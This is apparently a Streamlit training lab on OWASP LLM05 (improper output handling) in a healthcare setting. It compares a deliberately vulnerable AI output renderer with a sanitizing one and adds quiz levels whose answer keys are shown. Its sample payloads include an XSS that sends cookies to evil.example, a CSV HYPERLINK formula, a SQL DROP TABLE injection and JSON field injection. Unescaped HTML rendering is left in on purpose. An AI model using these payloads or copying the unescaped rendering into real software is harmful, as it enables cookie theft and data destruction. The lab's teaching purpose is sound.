import html
import json
import re
import base64
from datetime import datetime
from pathlib import Path

import pandas as pd
import streamlit as st
import streamlit.components.v1 as components

st.set_page_config(page_title="LLM05 — Improper Output Handling", page_icon="🧾", layout="wide")

components.html(
        """
        <script>
            const applyThemeAttr = () => {
                try {
                    const raw = localStorage.getItem("stActiveTheme-/-v2");
                    const selectedTheme = raw ? JSON.parse(raw) : "System";
                    const root = window.parent.document.documentElement;
                    root.setAttribute("data-st-theme", selectedTheme);
                } catch (e) {
                    // no-op
                }
            };
            applyThemeAttr();
            setTimeout(applyThemeAttr, 120);
            window.addEventListener("storage", applyThemeAttr);
        </script>
        """,
        height=0,
)

# -----------------------------
# Enterprise-style UI
# -----------------------------
st.markdown("""
<style>
:root {
    --primary:#d32f2f;
    --ink:#111827;
    --muted:#5b6475;
    --soft:#f5f7fb;
    --border:#e5e7eb;
    --app-bg:#ffffff;
    --panel-bg:#ffffff;
    --sidebar-bg:#f2f5f9;
    --hero-grad:linear-gradient(135deg,#fff 0%,#f8fbff 56%,#fff3f5 100%);
    --code-bg:#0f172a;
    --code-ink:#e5e7eb;
    --status-red-bg:#fee2e2;
    --status-red-ink:#991b1b;
    --status-green-bg:#dcfce7;
    --status-green-ink:#166534;
    --status-blue-bg:#dbeafe;
    --status-blue-ink:#1e40af;
    --status-amber-bg:#fef3c7;
    --status-amber-ink:#92400e;
}
html, body, [class*="css"] { font-family: Inter, Segoe UI, Roboto, Arial, sans-serif; color:var(--ink); }
.block-container { padding-top: 2.1rem; max-width: 1220px; }
section[data-testid="stAppViewContainer"], .stApp { background:var(--app-bg); }
section[data-testid="stSidebar"] { background:var(--sidebar-bg); border-right:1px solid var(--border); }
section[data-testid="stSidebar"] * { color:var(--ink); }
.hero { position:relative; padding:32px 250px 32px 38px; border-radius:28px; background:var(--hero-grad); border:1px solid var(--border); box-shadow:0 18px 45px rgba(17,24,39,.18); margin-bottom:28px; }
.hero h1 { font-size:43px; line-height:1.16; margin:0; font-weight:900; letter-spacing:-.045em; color:var(--ink); }
.hero p { color:var(--muted); font-size:18px; margin-top:14px; }
.hero-logo { position:absolute; top:20px; right:24px; width:170px; max-width:30%; height:auto; object-fit:contain; }
.hero-banner { display:block; width:100%; max-height:378px; object-fit:contain; object-position:center; border-radius:12px; margin-top:18px; margin-left:auto; margin-right:auto; }
.hero .hero-quote { color:#FFFFFF; font-size:19px; font-weight:800; font-style:italic; margin-top:14px; opacity:0.97; background:#111827; border-left:4px solid #FACC15; border-bottom:2px solid rgba(239,68,68,0.65); box-shadow:0 4px 20px rgba(34,197,94,0.3); padding:12px 16px; border-radius:8px; }
.page-quote { font-size:22px !important; font-weight:800 !important; font-style:italic; margin-top:20px; opacity:0.97; background:#111827; color:#FFFFFF; border-left:4px solid #FACC15; border-bottom:2px solid rgba(239,68,68,0.65); box-shadow:0 4px 20px rgba(34,197,94,0.3); padding:12px 16px; border-radius:8px; }
.pill { display:inline-block; padding:7px 13px; border-radius:999px; background:#fff0f2; color:#be123c; border:1px solid #ffd4da; font-weight:800; font-size:13px; margin-bottom:15px; }
.card { background:var(--panel-bg); border:1px solid var(--border); border-radius:22px; padding:22px 24px; box-shadow:0 10px 28px rgba(17,24,39,.18); margin:14px 0; color:var(--ink); }
.warning-card { border-left:10px solid #ff4b5c; background:#fff8f9; }
.secure-card { border-left:10px solid #22c55e; background:#f7fff9; }
.info-card { border-left:10px solid #3b82f6; background:#f7fbff; }
.amber-card { border-left:10px solid #f59e0b; background:#fffaf0; }
.vuln   { border-left:8px solid #ef4444; background:rgba(239,68,68,0.08); color:inherit; }
.secure { border-left:8px solid #16a34a; background:rgba(22,163,74,0.08); color:inherit; }
.info   { border-left:8px solid #2563eb; background:rgba(37,99,235,0.08); color:inherit; }
.warn   { border-left:8px solid #f59e0b; background:rgba(245,158,11,0.08); color:inherit; }
.badge-red   { display:inline-block; background:rgba(239,68,68,0.18); color:#ef4444; padding:4px 10px; border-radius:999px; font-weight:700; }
.badge-green { display:inline-block; background:rgba(22,163,74,0.18); color:#16a34a; padding:4px 10px; border-radius:999px; font-weight:700; }
.badge-blue  { display:inline-block; background:rgba(37,99,235,0.18); color:#2563eb; padding:4px 10px; border-radius:999px; font-weight:700; }
.codebox { background:var(--code-bg); color:var(--code-ink); border-radius:16px; padding:18px; font-family:Consolas, Menlo, monospace; white-space:pre-wrap; font-size:14px; line-height:1.5; overflow:auto; }
.badge-red,.badge-green,.badge-blue,.badge-amber { padding:5px 11px; border-radius:999px; font-size:16px; font-weight:900; }
.badge-red{background:var(--status-red-bg);color:var(--status-red-ink)}.badge-green{background:var(--status-green-bg);color:var(--status-green-ink)}.badge-blue{background:var(--status-blue-bg);color:var(--status-blue-ink)}.badge-amber{background:var(--status-amber-bg);color:var(--status-amber-ink)}
[data-testid="stRadio"] label { font-size:17px!important; }
.stButton>button { border-radius:12px; border:1px solid #ffb8c0; background:#d32f2f; color:white; font-weight:850; padding:.65rem 1.1rem; }
.stButton>button:hover { border-color:#e11d48; background:#e11d48; color:white; }
hr { border:none; border-top:1px solid var(--border); margin:24px 0; }
.small-muted { color:var(--muted); font-size:14px; }
@media (max-width: 900px) {
    .hero { padding:24px 24px 22px 24px; }
    .hero h1 { font-size:32px; }
    .hero-logo { position:static; display:block; max-width:180px; width:52%; margin:0 0 14px auto; }
}
</style>
""", unsafe_allow_html=True)

# -----------------------------
# Safe helpers — no bleach needed
# -----------------------------
def strip_tags(text: str) -> str:
    return re.sub(r"<[^>]+>", "", text or "")

def strip_dangerous_html(text: str) -> str:
    text = text or ""
    text = re.sub(r"(?is)<\s*(script|iframe|object|embed|style).*?>.*?<\s*/\s*\1\s*>", "[removed unsafe active content]", text)
    text = re.sub(r"(?is)on\w+\s*=\s*(['\"]).*?\1", "", text)
    text = re.sub(r"(?is)javascript\s*:", "blocked:", text)
    return html.escape(text)

def redact_phi(text: str) -> str:
    text = text or ""
    text = re.sub(r"\b[A-Z][a-z]+\s+[A-Z][a-z]+\b", "[REDACTED_NAME]", text)
    text = re.sub(r"\b\d{10}\b", "[REDACTED_PHONE]", text)
    text = re.sub(r"\b[A-Z]{2,6}-?\d{4,8}\b", "[REDACTED_ID]", text)
    text = re.sub(r"\b\d{2}/\d{2}/\d{4}\b", "[REDACTED_DATE]", text)
    text = re.sub(r"[\w\.-]+@[\w\.-]+", "[REDACTED_EMAIL]", text)
    return text

def neutralize_csv_formula(value: str) -> str:
    return "'" + value if isinstance(value, str) and value[:1] in ["=", "+", "-", "@"] else value

def safe_json_payload(text: str) -> str:
    payload = {
        "status": "safe_output",
        "summary": redact_phi(strip_tags(text))[:220],
        "allowed_actions": ["display_summary", "ask_clinician_to_verify"],
        "blocked_actions": ["execute_html", "run_sql", "auto_update_patient_record"],
        "review_required": True,
    }
    return json.dumps(payload, indent=2)

def vulnerable_ai(prompt: str, attack_type: str) -> str:
    templates = {
        "Stored XSS in Diagnostic & Clinical Informatics": "Generated clinical note:\n" + prompt,
        "Unsafe HTML in Philips Ultrasound Report": f"<div><b>Ultrasound Finding:</b> {prompt}</div>",
        "CSV Formula Injection in Patient Monitoring Export": "patient_id,device,finding\nPM-4451,Patient Monitor," + prompt,
        "SQL/Command Output Injection in MRI Workflow": "UPDATE patient_records SET ai_summary='" + prompt + "' WHERE modality='MRI';",
        "Unsafe JSON to CT Downstream Application": '{"modality":"Computed Tomography","ai_result":"' + prompt + '","action":"auto_publish"}',
        "PHI Leakage in Image-Guided Therapy Summary": "Therapy summary: " + prompt + "\nExported to: dashboard, email, analytics lake",
    }
    return templates.get(attack_type, prompt)

def secure_ai(prompt: str, attack_type: str) -> str:
    if "CSV" in attack_type:
        return "patient_id,device,finding\nPM-4451,Patient Monitor," + neutralize_csv_formula(redact_phi(strip_tags(prompt)))
    if "JSON" in attack_type:
        return safe_json_payload(prompt)
    if "SQL" in attack_type:
        return "Blocked: AI output must not be concatenated into SQL/commands. Use parameterized APIs, schema validation, and workflow approval."
    if "PHI" in attack_type:
        return "Therapy summary: " + redact_phi(strip_tags(prompt)) + "\nPolicy: minimum necessary, RBAC enforced, audit logged."
    return strip_dangerous_html(redact_phi(prompt))

SCENARIOS = {
    "Stored XSS in Diagnostic & Clinical Informatics": "<img src=x onerror=alert('PHI exfiltration from clinical informatics')> Patient: Anita Rao, MRN MRI-88221",
    "Unsafe HTML in Philips Ultrasound Report": "Normal fetal ultrasound. <script>fetch('https://evil.example/steal?cookie='+document.cookie)</script>",
    "CSV Formula Injection in Patient Monitoring Export": "=HYPERLINK(\"http://evil.example/?bed=ICU-7&spo2=86\",\"Open monitor alert\")",
    "SQL/Command Output Injection in MRI Workflow": "stable'; DROP TABLE patient_records;--",
    "Unsafe JSON to CT Downstream Application": "CT complete\", \"action\":\"override_clinician_review\", \"publish\":true, \"x\":\"",
    "PHI Leakage in Image-Guided Therapy Summary": "Ramesh Kumar, phone 9876543210, email ramesh.k@example.com, MRN CT-77881, scan date 12/04/2026",
}

LEVELS = [
    {"n":1,"title":"Escape HTML in Diagnostic Informatics","context":"A generated diagnostic note contains embedded HTML. What control prevents browser execution?","answer":"ESCAPE_HTML","hint":"Encode < and > before rendering."},
    {"n":2,"title":"Redact PI/PHI","context":"AI summary includes patient name, phone, MRN, email, and scan date.","answer":"REDACT_PHI","hint":"Minimum necessary output."},
    {"n":3,"title":"Block SQL Output Execution","context":"MRI assistant returns SQL-like text that a downstream workflow may execute.","answer":"BLOCK_SQL_OUTPUT","hint":"Never execute generated text as a command."},
    {"n":4,"title":"Safe Clinical Summary","context":"A patient-monitoring summary must be shown to nurses without raw identifiers.","answer":"SAFE_CLINICAL_SUMMARY","hint":"Redact, summarize, and require verification."},
    {"n":5,"title":"Content Security Policy","context":"Clinical informatics web UI needs a browser-level backstop against injected scripts.","answer":"CONTENT_SECURITY_POLICY","hint":"A browser policy can limit script execution."},
]

# Session state
st.session_state.setdefault("level_index", 0)
st.session_state.setdefault("level_feedback", "")
st.session_state.setdefault("level_ready_for_next", False)
st.session_state.setdefault("logs", [])

def normalize(value: str) -> str:
    return re.sub(r"\s+", "", (value or "").strip().upper())

def log_event(action: str, detail: str):
    st.session_state.logs.append({"time": datetime.now().strftime("%H:%M:%S"), "action": action, "detail": detail})

def validate_level(input_key: str):
    idx = st.session_state.level_index
    level = LEVELS[idx]
    if normalize(st.session_state.get(input_key, "")) == normalize(level["answer"]):
        log_event("Level passed", f"Level {level['n']} - {level['answer']}")
        st.session_state.level_ready_for_next = True
        st.session_state.level_feedback = "Correct. Click Next Level to continue."
    else:
        log_event("Level failed", f"Level {level['n']}")
        st.session_state.level_ready_for_next = False
        st.session_state.level_feedback = "Not yet. Review the scenario and try the correct output-handling control."

def go_to_next_level():
    st.session_state.level_index += 1
    st.session_state.level_ready_for_next = False
    st.session_state.level_feedback = "Next level loaded."

def reset_level():
    idx = st.session_state.level_index
    current_key = f"level_input_{idx}"
    if current_key in st.session_state:
        del st.session_state[current_key]
    st.session_state.level_ready_for_next = False
    st.session_state.level_feedback = "Current input cleared."

def restart_levels():
    for key in list(st.session_state.keys()):
        if key.startswith("level_input_"):
            del st.session_state[key]
    st.session_state.level_index = 0
    st.session_state.level_ready_for_next = False
    st.session_state.level_feedback = "Levels restarted."

# Sidebar
st.sidebar.markdown("## Navigation")
st.sidebar.markdown("Choose view")
view = st.sidebar.radio(
    "",
    [
        "1. Overview",
        "2. Vulnerable Healthcare AI",
        "3. Secure Healthcare AI",
        "4. Side-by-Side Comparison",
        "5. Interactive Levels",
        "6. Defense Guidance",
    ],
    label_visibility="collapsed",
)
st.sidebar.markdown("---")
st.sidebar.markdown("<span class='small-muted'>All secrets, device outputs, and patient records are synthetic demo values.</span>", unsafe_allow_html=True)

logo_path = Path(__file__).parent / "assets" / "philip.png"
hero_logo_html = ""
if logo_path.exists():
        logo_b64 = base64.b64encode(logo_path.read_bytes()).decode("ascii")
        hero_logo_html = f"<img class='hero-logo' src='data:image/png;base64,{logo_b64}' alt='Philips logo'/>"

hero_banner_path = Path(__file__).parent / "assets" / "improper_output_handling.png"
hero_banner_html = ""
if hero_banner_path.exists():
    banner_b64 = base64.b64encode(hero_banner_path.read_bytes()).decode("ascii")
    hero_banner_html = f"<img class='hero-banner' src='data:image/png;base64,{banner_b64}' alt='Improper Output Handling overview'/>"

attack_types = list(SCENARIOS.keys())

if view == "1. Overview":
    st.markdown(f"""
<div class="hero">
    {hero_logo_html}
  <div class="pill">OWASP LLM05 • Healthcare Output Security</div>
  <h1>🧧 LLM05 — Improper Output Handling </h1>
  <p style="margin-top:12px;font-size:19px;color:var(--muted,#6b7280);max-width:820px;">AI returns <strong style="color:#ef4444;">unsafe, sensitive, incorrect, or excessive information</strong> without proper validation or filtering.</p>
  {hero_banner_html}
  <p class="hero-quote">In healthcare AI, a single unfiltered response can expose sensitive data, damage trust, and impact patient safety</p>
</div>
""", unsafe_allow_html=True)
    st.markdown("#### What Can Be Exposed?")
    st.markdown("""
<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:20px;">
  <div class="card vuln" style="margin-bottom:0;text-align:center;padding:22px 16px;">
    <div style="font-size:32px;margin-bottom:10px;">🩺</div>
    <div style="font-weight:800;font-size:18px;">Exposure of PHI/PII Data</div>
    <div style="font-size:15px;opacity:0.75;margin-top:6px;">Patient identifiers, MRNs, and health records leaked in AI output</div>
  </div>
  <div class="card vuln" style="margin-bottom:0;text-align:center;padding:22px 16px;">
    <div style="font-size:32px;margin-bottom:10px;">🔓</div>
    <div style="font-weight:800;font-size:18px;">Internal Prompts or Secrets Leaked</div>
    <div style="font-size:15px;opacity:0.75;margin-top:6px;">System prompts, API keys, and internal configurations exposed</div>
  </div>
  <div class="card vuln" style="margin-bottom:0;text-align:center;padding:22px 16px;">
    <div style="font-size:32px;margin-bottom:10px;">⚕️</div>
    <div style="font-weight:800;font-size:18px;">Wrong Medical Recommendations</div>
    <div style="font-size:15px;opacity:0.75;margin-top:6px;">Incorrect or unsafe clinical guidance delivered without validation</div>
  </div>
  <div class="card vuln" style="margin-bottom:0;text-align:center;padding:22px 16px;">
    <div style="font-size:32px;margin-bottom:10px;">⚠️</div>
    <div style="font-weight:800;font-size:18px;">Unsafe AI-Generated Responses</div>
    <div style="font-size:15px;opacity:0.75;margin-top:6px;">Scripts, injection payloads, or harmful content in AI output</div>
  </div>
</div>
""", unsafe_allow_html=True)

    st.markdown("#### Common Causes")
    st.markdown("""
<div class="card warn" style="padding:18px;">
  <div style="display:flex;flex-wrap:wrap;gap:10px;">
    <span class="badge-red">Missing Output Validation</span>
    <span class="badge-red">No Content Filtering</span>
    <span class="badge-red">Weak Access Controls</span>
    <span class="badge-red">Prompt Injection Attacks</span>
    <span class="badge-red">Excessive AI Permissions</span>
    <span class="badge-red">Lack of Role-Based Access</span>
  </div>
</div>""", unsafe_allow_html=True)

    st.markdown("#### Simple Flow")
    st.markdown("""
<div class="card info" style="padding:18px;">
  <div style="display:flex;align-items:center;flex-wrap:wrap;gap:8px;justify-content:center;font-size:15px;">
    <span class="badge-red">User Prompt</span>
    <span style="font-size:18px;opacity:0.6;">→</span>
    <span class="badge-red">AI Generates Response</span>
    <span style="font-size:18px;opacity:0.6;">→</span>
    <span class="badge-red">No Validation</span>
    <span style="font-size:18px;opacity:0.6;">→</span>
    <span class="badge-red">Unsafe Output Returned</span>
  </div>
</div>""", unsafe_allow_html=True)

    st.markdown("#### Impact of Improper Output Handling")
    st.markdown("""
<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;margin-bottom:20px;">
  <div class="card vuln" style="margin-bottom:0;">
    <div style="font-weight:800;font-size:18px;margin-bottom:12px;">🏥 Patient &amp; Clinical Risks</div>
    <div style="display:flex;flex-direction:column;gap:8px;font-size:17px;">
      <span class="badge-red">Wrong diagnosis or treatment</span>
      <span class="badge-red">Patient safety issues</span>
      <span class="badge-red">Clinical misinformation</span>
    </div>
  </div>
  <div class="card vuln" style="margin-bottom:0;">
    <div style="font-weight:800;font-size:18px;margin-bottom:12px;">🔒 Privacy &amp; Compliance Risks</div>
    <div style="display:flex;flex-direction:column;gap:8px;font-size:17px;">
      <span class="badge-red">PHI/PII exposure</span>
      <span class="badge-red">HIPAA/GDPR violations</span>
      <span class="badge-red">Regulatory penalties</span>
    </div>
  </div>
  <div class="card vuln" style="margin-bottom:0;">
    <div style="font-weight:800;font-size:18px;margin-bottom:12px;">💼 Business Impact</div>
    <div style="display:flex;flex-direction:column;gap:8px;font-size:17px;">
      <span class="badge-red">Loss of trust</span>
      <span class="badge-red">Financial loss</span>
      <span class="badge-red">Brand reputation damage</span>
      <span class="badge-red">Operational disruption</span>
    </div>
  </div>
</div>""", unsafe_allow_html=True)

    st.markdown("#### What This Lab Covers")
    c1, c2, c3, c4 = st.columns(4)
    c1.metric("Attack Types", "6", help="XSS, CSV, SQL, PHI, JSON, Markdown")
    c2.metric("Interactive Levels", "5", help="Output-handling defense challenges")
    c3.metric("Healthcare Domains", "5", help="Ultrasound, CT, MRI, IGT, Patient Monitoring")
    c4.metric("Domain", "Healthcare", help="Philips medical AI context")

elif view == "2. Vulnerable Healthcare AI":
    st.markdown("## 1. Vulnerable Healthcare AI")
    st.markdown("<div class='card warning-card'><b>Purpose:</b> Demonstrates what can go wrong when AI output is directly rendered, exported, or passed to downstream workflows without validation, encoding, or approval gates.</div>", unsafe_allow_html=True)
    attack = st.selectbox("Attack Type", attack_types)
    prompt = st.text_area("Prompt / Transcript / Document Content", value=SCENARIOS[attack], height=150)
    if st.button("Run Vulnerable Simulation"):
        out = vulnerable_ai(prompt, attack)
        log_event("Vulnerable simulation", attack)
        st.markdown("<span class='badge-red'>UNSAFE OUTPUT</span>", unsafe_allow_html=True)
        st.markdown(f"<div class='codebox'>{out}</div>", unsafe_allow_html=True)
        st.error("Issue: output is trusted and may execute, leak PHI, poison exports, or trigger unsafe downstream actions.")

elif view == "3. Secure Healthcare AI":
    st.markdown("## 2. Secure Healthcare AI")
    st.markdown("<div class='card secure-card'><b>Purpose:</b> Applies output encoding, sanitization, schema validation, PHI redaction, RBAC, and human approval gates before content reaches healthcare applications.</div>", unsafe_allow_html=True)
    attack = st.selectbox("Attack Type", attack_types)
    prompt = st.text_area("Prompt / Transcript / Document Content", value=SCENARIOS[attack], height=150)
    if st.button("Run Secure Simulation"):
        out = secure_ai(prompt, attack)
        log_event("Secure simulation", attack)
        st.markdown("<span class='badge-green'>SAFE OUTPUT</span>", unsafe_allow_html=True)
        st.markdown(f"<div class='codebox'>{html.escape(out)}</div>", unsafe_allow_html=True)
        st.success("Controls applied: output treated as untrusted data, sanitized/encoded/redacted, and blocked from direct execution.")

elif view == "4. Side-by-Side Comparison":
    st.markdown("## 4. Side-by-Side Comparison")
    st.markdown("<div class='card info-card'><b>Goal:</b> Compare how the same healthcare AI output behaves with and without output-handling controls.</div>", unsafe_allow_html=True)
    attack = st.selectbox("Attack Type", attack_types)
    prompt = st.text_area("Prompt / Transcript / Document Content", value=SCENARIOS[attack], height=140)
    if st.button("Compare Vulnerable vs Secure"):
        log_event("Side-by-side comparison", attack)
        c1, c2 = st.columns(2)
        with c1:
            st.markdown("<div class='card warning-card'><h3>❌ Vulnerable Output</h3></div>", unsafe_allow_html=True)
            st.markdown(f"<div class='codebox'>{vulnerable_ai(prompt, attack)}</div>", unsafe_allow_html=True)
        with c2:
            st.markdown("<div class='card secure-card'><h3>✅ Secure Output</h3></div>", unsafe_allow_html=True)
            st.markdown(f"<div class='codebox'>{html.escape(secure_ai(prompt, attack))}</div>", unsafe_allow_html=True)

elif view == "5. Interactive Levels":
    st.markdown("## 4. Interactive Levels")
    st.markdown("<div class='card info-card'><b>Rules:</b> Identify the correct output-handling defense for each healthcare scenario. Default prompts are hidden. Each level uses a fresh input field, so the previous answer is cleared automatically. Answers are available in <b>Answers.txt</b>.</div>", unsafe_allow_html=True)
    if st.session_state.level_feedback:
        if st.session_state.level_feedback.startswith("Correct"):
            st.success(st.session_state.level_feedback)
        elif st.session_state.level_feedback.startswith("Not"):
            st.error(st.session_state.level_feedback)
        else:
            st.info(st.session_state.level_feedback)
    idx = st.session_state.level_index
    if idx >= len(LEVELS):
        st.balloons()
        st.success("All LLM05 levels completed. You identified the key improper-output-handling defenses.")
        st.button("Restart Levels", on_click=restart_levels)
    else:
        level = LEVELS[idx]
        is_last_level = idx == len(LEVELS) - 1
        st.progress((idx + 1) / len(LEVELS))
        st.markdown(f"<div class='card'><span class='badge-blue'>LEVEL {level['n']} of {len(LEVELS)}</span><h3>{level['title']}</h3><p>{level['context']}</p></div>", unsafe_allow_html=True)
        with st.expander("Need a hint?"):
            st.info(level["hint"])
        input_key = f"level_input_{idx}"
        st.text_input("Your answer", key=input_key, placeholder="Type the defense keyword, for example ESCAPE_HTML")
        col_a, col_b, col_c = st.columns([1, 1, 1])
        with col_a:
            st.button("Validate Answer", on_click=validate_level, args=(input_key,))
        with col_b:
            st.button("Reset Current Level Input", on_click=reset_level)
        with col_c:
            if st.session_state.level_ready_for_next and not is_last_level:
                st.button("Next Level", on_click=go_to_next_level)
        if st.session_state.level_ready_for_next and is_last_level:
            st.balloons()
            st.success("All LLM05 levels completed. You identified the key improper-output-handling defenses.")
            st.button("Restart Levels", on_click=restart_levels)

elif view == "6. Defense Guidance":
    st.markdown("## 6. Defense Guidance")
    st.markdown("""
<div class="card info">
  <b>How to Prevent LLM05 Improper Output Handling</b><br><br>
  <table style="width:100%;border-collapse:collapse;">
    <tr>
      <td style="width:50%;padding:6px 12px;vertical-align:top;">🔒 Apply <b>Output Encoding</b> — render AI output as text, not executable HTML/JS</td>
      <td style="width:50%;padding:6px 12px;vertical-align:top;">🚫 <b>Sanitize</b> scripts, event handlers, unsafe markdown links, and active content</td>
    </tr>
    <tr>
      <td style="padding:6px 12px;vertical-align:top;">🧬 Apply <b>Schema Validation</b> — allow only expected JSON fields and values before downstream processing</td>
      <td style="padding:6px 12px;vertical-align:top;">🩺 Apply <b>PHI Redaction</b> — minimum-necessary output before display, export, or analytics</td>
    </tr>
    <tr>
      <td style="padding:6px 12px;vertical-align:top;">📈 Apply <b>CSV Protection</b> — neutralize cells beginning with =, +, -, or @ before export</td>
      <td style="padding:6px 12px;vertical-align:top;">🗄️ Enforce <b>Command/SQL Safety</b> — never concatenate AI output into SQL or workflow actions</td>
    </tr>
    <tr>
      <td style="padding:6px 12px;vertical-align:top;">👤 Enforce <b>RBAC &amp; Context Controls</b> — limit output visibility by user role and care context</td>
      <td style="padding:6px 12px;vertical-align:top;">✋ Require <b>Human Approval</b> for high-impact clinical actions before execution</td>
    </tr>
    <tr>
      <td style="padding:6px 12px;vertical-align:top;">🌐 Enforce <b>Content Security Policy</b> — browser-level backstop against injected scripts</td>
      <td style="padding:6px 12px;vertical-align:top;">🏥 Validate <b>DICOM &amp; clinical overlays</b> as plain text, never render as HTML</td>
    </tr>
    <tr>
      <td style="padding:6px 12px;vertical-align:top;">📜 <b>Log and monitor</b> all prompts, outputs, blocked events, and downstream actions</td>
      <td style="padding:6px 12px;vertical-align:top;">🧪 Continuously <b>test output-handling controls</b> across all modalities and export formats</td>
    </tr>
  </table>
</div>
<p class='page-quote'>Improper output handling can turn innovation into liability within seconds.</p>
""", unsafe_allow_html=True)


